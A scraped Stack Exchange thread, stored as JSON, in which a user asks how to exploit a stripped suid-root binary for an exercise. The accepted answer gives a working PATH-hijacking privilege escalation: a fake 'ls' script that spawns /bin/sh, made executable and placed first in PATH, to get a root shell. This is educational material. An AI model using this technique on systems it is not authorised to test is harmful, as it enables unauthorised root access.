{
    "title": "How to exploit an suid root application",
    "link": "https://reverseengineering.stackexchange.com/questions/17576/how-to-exploit-an-suid-root-application",
    "content": "I have to exploit an application and I have only the 32-bit ELF excecutable, which is also stripped. Its a suid root application and when it is executed practically run the <pre><code>ls -al</code></pre> command for a specific directory that normally is inaccessible for normal users.\nAny advice about how to handle this problem?\n",
    "votes": "1",
    "answers": 1,
    "views": "4k",
    "tags": [
        "elf",
        "exploit"
    ],
    "user": "John Rewei",
    "time": "May 7, 2018 at 20:38",
    "comments": [
        {
            "user": "user23101",
            "text": "what are the inputs that you control? can you effect the arguments of <pre><code>ls -al</code></pre>?\n",
            "time": null
        },
        {
            "user": "joxeankoret",
            "text": "Check for how can you influence that command, it's most likely a system() call. Environment variables and command line arguments are the candidates. However, without disassembly, it's impossible to say.\n",
            "time": null
        },
        {
            "user": "John Rewei",
            "text": "I have tried a lot of inputs with patterns but I cannot spot any influence in memory. I can show you disassembly but because of the fact that the file is stripped has no info about functions.\n",
            "time": null
        },
        {
            "user": "Paweł Łukasik",
            "text": "how do you know it's exploitable?\n",
            "time": null
        },
        {
            "user": "John Rewei",
            "text": "its an exercise and it says it is\n",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "If the program is setuid, you can use the fact that it is calling the command <pre><code>ls -al /tmp</code></pre> through <pre><code>system()</code></pre> from the <pre><code>main()</code></pre> function.\n\nCreate a file <pre><code>ls</code></pre> which contains:\n<pre><code>#!/bin/sh\n/bin/sh\n</code></pre>\nSet it as an executable script:\n<pre><code>#> chmod +x ./ls\n</code></pre>\nModify your <pre><code>PATH</code></pre> to point to the current directory:\n<pre><code>#> export PATH=.:${PATH}\n</code></pre>\nRun the weak software (where you have the fake <pre><code>ls</code></pre> script):\n<pre><code>#> /path/to/test\n</code></pre>\n\nJust a remark, the rest of the software seems to have been obfuscated, at least by renaming the subroutines into <pre><code>sub_xxxx</code></pre>. It may also contain other obfuscations.\n",
            "votes": "4",
            "user": "perror",
            "time": "Mar 19, 2018 at 14:50",
            "is_accepted": true,
            "comments": []
        }
    ]
}